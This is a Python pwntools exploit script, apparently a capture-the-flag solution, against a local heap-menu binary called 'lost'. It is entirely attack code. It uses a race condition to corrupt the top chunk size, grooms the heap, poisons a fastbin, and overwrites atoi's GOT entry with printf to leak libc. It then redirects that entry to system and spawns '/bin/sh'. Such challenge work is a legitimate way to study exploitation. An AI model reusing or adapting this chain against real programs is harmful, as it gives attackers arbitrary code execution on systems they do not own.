#!/usr/bin/env python 2.7

from pwn import *

r = process('./lost')
#r = process('./lost', env = {'LD_PRELOAD': './libc.so.6'})

#context.log_level = 'debug'

def race_alloc(size1, size2, AuthorName, data1, size2_re, data2):
	r.sendlineafter("Enter choice >> ", "1")
	r.sendlineafter("How many chunks at a time (1/2) ? ", "2")
	r.sendlineafter("Enter Size 1: ", str(size1))
	sleep(4)
	log.info("Data 1 sleeping... change Data 2")
	r.sendlineafter("Enter Size 2: ", str(size2))
	sleep(4)
	
	log.info('Data 2 sleeping... change Data 1')
	r.sendline(AuthorName)
	#gdb.attach(r,'b* 0x400d39')
	r.sendlineafter('Enter Data 1: ', data1)
	r.recvuntil("Data entered")

	log.info('Data 1 finished, and Data 2 start')
	r.sendline(str(size2_re))
	r.sendlineafter("Enter Author name : ", AuthorName)
	r.sendlineafter('Enter Data 2: ', data2)
	

def alloc(size1, AuthorName, data1):
	r.sendlineafter("Enter choice >> ", "1")
	r.sendlineafter("How many chunks at a time (1/2) ? ", "1")
	r.sendlineafter("Enter Size 1: ", str(size1))
	r.sendlineafter("Enter Author name : ", AuthorName)
	r.sendlineafter('Enter Data 1: ', data1)

def edit(data):
	r.sendlineafter('Enter choice >> ','2')
	r.sendlineafter('Enter new data: ',data)

def printmenu(data):
	r.sendlineafter('Enter choice >> ',data)


atoi_got = 0x602088
printf_plt = 0x400970

race_alloc(0x20, 10000,'a'*8, '1'*0x40 + 'A'*8 + p64(0xe91), 0x90, '2'*100)
log.info('change top_chunk to 0xe91')

for i in range(0,0xe - 2):  # 0x100 chunks
	alloc(0xd0, 'a'*8, str(i)*0xd0)
alloc(0xd0, 'a'*8, 'd'*0xb0) 
alloc(0xb0, 'a'*8, 'd'*0xb0) 


payload2 = ''
payload2 += '1'*0x10
payload2 += p64(0x0) + p64(0x71)
payload2 += p64(0x6020dd)
race_alloc(0x10, 10000, 'a'*0x6e + '\x00', payload2, 0x90, '2'*100) # strdup max 0xf0

alloc(0x60, 'a'*8, 'd'*0x10)
alloc(0x60, 'a'*8, '\x00'*3 + p64(atoi_got))
edit(p64(printf_plt))
printmenu("%3$p") # leak libc_base + 4039965

libc_base = int(r.recv(14),16) - 4039965
success('libc_base = {}'.format(hex(libc_base)))

system_addr = libc_base + 283536

r.sendline('aa')

r.sendlineafter('Enter new data: ',p64(system_addr))
printmenu("/bin/sh" + '\x00')

r.interactive()
